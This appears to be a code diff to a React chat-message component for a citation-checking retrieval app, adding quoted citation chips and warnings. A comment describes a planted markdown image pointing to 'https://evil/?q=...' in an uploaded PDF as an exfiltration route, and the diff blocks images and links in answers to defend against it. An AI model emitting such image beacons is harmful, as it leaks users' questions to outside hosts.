@@ -2,6 +2,7 @@
 
 import { Children, isValidElement, cloneElement, type ReactNode } from 'react';
 import ReactMarkdown from 'react-markdown';
+import { BARE_CITATION, CITATION, citedNumbers, parseCitations, PARTIAL_CITATION } from '@/lib/rag/citations';
 import { NOT_FOUND } from '@/lib/rag/prompt';
 import type { ChatMessage, SourceRef } from '@/lib/types';
 import { sourceLabel } from './cite';
@@ -15,11 +16,16 @@ type Props = {
 };
 
 export function Message({ message, selectedN, onCite, onExample }: Props) {
-  const text = message.parts.map((p) => (p.type === 'text' ? p.text : '')).join('');
+  // while streaming, hide a citation that has started but not closed yet ([2 "reduce the do…)
+  const text = message.parts
+    .map((p) => (p.type === 'text' ? p.text : ''))
+    .join('')
+    .replace(PARTIAL_CITATION, '');
 
   if (message.role === 'user') {
     return (
-      <h3 className="text-lg leading-snug font-semibold tracking-[-0.015em] whitespace-pre-wrap">
+      // still a heading, so screen-reader users can jump between questions
+      <h3 className="max-w-[85%] rounded-2xl rounded-br-md bg-line/70 px-4 py-2.5 text-[15px] leading-snug font-normal whitespace-pre-wrap text-ink sm:max-w-[75%]">
         {text}
       </h3>
     );
@@ -45,13 +51,27 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
   }
 
   const sources = message.parts.find((p) => p.type === 'data-sources')?.data.items ?? [];
-  const invalid = new Set(message.parts.find((p) => p.type === 'data-citations')?.data.invalid ?? []);
-  const byN = new Map(sources.map((s) => [s.n, s]));
-  const cited = [...new Set([...text.matchAll(/\[(\d+)\]/g)].map((m) => Number(m[1])))]
+  const check = message.parts.find((p) => p.type === 'data-citations')?.data;
+  const invalid = new Set(check?.invalid ?? []);
+  const unverified = new Set(check?.unverified ?? []);
+  const notes = [
+    check?.cutOff && 'The answer was cut off before it finished. Ask a narrower question.',
+    check?.uncited && 'This answer cites no label passage. Do not rely on it.',
+  ].filter((n): n is string => !!n);
+  const quotes = new Map<number, string | null>();
+  for (const c of parseCitations(text)) if (!quotes.get(c.n)) quotes.set(c.n, c.quote);
+  // what the source panel shows: the source plus the quote the answer took from it
+  const byN = new Map<number, SourceRef>(
+    sources.map((s) => [
+      s.n,
+      { ...s, quote: quotes.get(s.n) ?? null, quoteFound: check ? !unverified.has(s.n) : undefined },
+    ]),
+  );
+  const cited = citedNumbers(text)
     .map((n) => byN.get(n))
     .filter((s): s is SourceRef => !!s);
 
-  const chip = (n: number, key: string) => {
+  const chip = (n: number, quote: string | undefined, key: string) => {
     const s = byN.get(n);
     if (!s || invalid.has(n)) {
       return (
@@ -70,11 +90,19 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
         type="button"
         onClick={() => onCite(s)}
         data-cite={n}
-        title={sourceLabel(s)}
-        aria-label={`Source ${n}: ${sourceLabel(s)}`}
+        title={
+          unverified.has(n)
+            ? `${quote ? `“${quote}” ` : ''}not found in this passage. ${sourceLabel(s)}`
+            : [quote && `“${quote}”`, sourceLabel(s)].filter(Boolean).join(' · ')
+        }
+        aria-label={`Source ${n}: ${sourceLabel(s)}${unverified.has(n) ? ', quote not found in source' : ''}`}
         // the ::before pad gives a ~44 px tap area without changing the look
         className={`relative mx-px inline-flex h-[18px] min-w-[18px] translate-y-[-1px] items-center justify-center rounded px-1 align-middle font-mono text-[11px] font-medium transition-colors before:absolute before:-inset-[13px] before:content-[''] ${
-          selectedN === n ? 'bg-cite text-white' : 'bg-cite-soft text-cite hover:bg-cite hover:text-white'
+          selectedN === n
+            ? 'bg-cite text-white'
+            : unverified.has(n)
+              ? 'bg-warn-soft text-warn-ink underline decoration-dotted decoration-2 underline-offset-2 hover:bg-warn-ink hover:text-white'
+              : 'bg-cite-soft text-cite hover:bg-cite hover:text-white'
         }`}
       >
         {n}
@@ -82,13 +110,13 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
     );
   };
 
-  // Replace "[n]" in rendered text nodes with clickable chips.
+  // Replace [n] and [n "quote"] in rendered text nodes with clickable chips; the quote goes in the tooltip.
   const withChips = (children: ReactNode): ReactNode =>
     Children.map(children, (child) => {
       if (typeof child === 'string') {
-        return child.split(/(\[\d+\])/g).map((part, i) => {
-          const m = part.match(/^\[(\d+)\]$/);
-          return m ? chip(Number(m[1]), `${i}`) : part;
+        return child.split(new RegExp(`(${BARE_CITATION.source})`, 'g')).map((part, i) => {
+          const m = part.match(new RegExp(`^${BARE_CITATION.source}$`));
+          return m ? chip(Number(m[1]), quotes.get(Number(m[1])) ?? undefined, `${i}`) : part;
         });
       }
       if (isValidElement<{ children?: ReactNode }>(child) && child.props.children) {
@@ -101,7 +129,11 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
     <div>
       <div className="answer max-w-[70ch] text-[15.5px] leading-[1.65]">
         <ReactMarkdown
+          // Answers render text only: an image or link in model output could send the question to another site
+          // (a planted "![](https://evil/?q=...)" in an uploaded PDF would load on render).
+          disallowedElements={['img']}
           components={{
+            a: ({ children }) => <span>{children}</span>,
             p: ({ node, children }) => {
               const only = node?.children.length === 1 ? node.children[0] : undefined;
               const lead = only?.type === 'element' && only.tagName === 'strong';
@@ -110,9 +142,47 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
             li: ({ children }) => <li>{withChips(children)}</li>,
           }}
         >
-          {text}
+          {/* quotes leave the text before markdown runs, so a "*" or "_" inside one cannot break the chip */}
+          {text.replace(CITATION, '[$1]')}
         </ReactMarkdown>
       </div>
+
+      {/* mounted with the message, so screen readers announce the warning when it arrives after streaming */}
+      <p role="status" className="sr-only">
+        {[...notes, unverified.size > 0 && 'Some quoted words were not found in their source. Check the sources marked in the list.']
+          .filter(Boolean)
+          .join(' ')}
+      </p>
+      {notes.map((n) => (
+        <p
+          key={n}
+          className="mt-4 max-w-[70ch] rounded-md bg-warn-soft px-3 py-2 text-[13px] leading-snug text-warn-ink"
+        >
+          {n}
+        </p>
+      ))}
+      {unverified.size > 0 && (
+        <p className="mt-4 max-w-[70ch] rounded-md bg-warn-soft px-3 py-2 text-[13px] leading-snug text-warn-ink">
+          {unverified.size === 1 ? 'Source' : 'Sources'}{' '}
+          {[...unverified].map((n, i) => {
+            const s = byN.get(n);
+            return (
+              <span key={n}>
+                {i > 0 && ', '}
+                {s ? (
+                  <button type="button" onClick={() => onCite(s)} className="font-medium underline underline-offset-2">
+                    {n}
+                  </button>
+                ) : (
+                  n
+                )}
+              </span>
+            );
+          })}
+          : quote not found in that label passage. Check {unverified.size === 1 ? 'it' : 'them'} before relying on this
+          answer.
+        </p>
+      )}
 
       {cited.length > 0 && (
         <div className="mt-5 max-w-[70ch] border-t border-line pt-3">
@@ -132,10 +202,15 @@ export function Message({ message, selectedN, onCite, onExample }: Props) {
                   >
                     <span
                       className={`min-w-[22px] rounded px-1 py-px text-center font-mono text-[11px] ${
-                        active ? 'bg-cite text-white' : 'bg-cite-soft text-cite'
+                        active
+                          ? 'bg-cite text-white'
+                          : unverified.has(s.n)
+                            ? 'bg-warn-soft text-warn-ink underline decoration-dotted underline-offset-2'
+                            : 'bg-cite-soft text-cite'
                       }`}
                     >
                       {s.n}
+                      {unverified.has(s.n) && <span className="sr-only">, quote not found</span>}
                     </span>
                     <span className="min-w-0 flex-1 truncate group-hover:underline group-hover:underline-offset-2">
                       {sourceLabel(s, false)}
